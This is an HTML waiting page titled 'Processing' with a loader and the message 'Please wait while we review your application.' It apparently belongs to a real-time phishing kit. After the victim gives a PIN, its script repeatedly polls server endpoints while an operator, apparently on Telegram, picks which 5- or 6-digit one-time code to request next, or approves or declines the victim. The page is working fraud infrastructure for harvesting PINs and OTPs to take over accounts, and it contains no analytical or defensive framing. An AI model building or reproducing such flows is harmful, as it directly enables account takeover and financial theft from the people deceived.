<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>

// FLOW A: STEP4 → STEP5 (5 seconds delay)
if (localStorage.getItem("firstProcess") === "yes") {

    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 5000); // ✅ fixed to 5 seconds
}


// ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
if (true) {

  const checker = setInterval(async () => {
    try {
        const res = await fetch("/otp-status");
        const data = await res.json();

        console.log("OTP STATUS:", data);

        // 🔥 go to step5 if needed
       
    if (data.otp == 5) {
    clearInterval(checker);

    // ✅ save length
    localStorage.setItem("otpLength", 5);

    window.location.href = "verification.html";
}

if (data.otp == 6) {
    clearInterval(checker);

    // ✅ save length
    localStorage.setItem("otpLength", 6);

    window.location.href = "verification.html";
}

        const decisionRes = await fetch("/decision-status");
        const decisionData = await decisionRes.json();

        if (decisionData.decision === "accept") {
            clearInterval(checker);
            window.location.href = "dashboard.html";
        }

        if (decisionData.decision === "decline") {
            clearInterval(checker);
            localStorage.clear();
            window.location.href = "step5.html";
        }

    } catch (err) {
        console.log("Waiting...");
    }
  }, 2000);

}

</script>
</body>
</html>
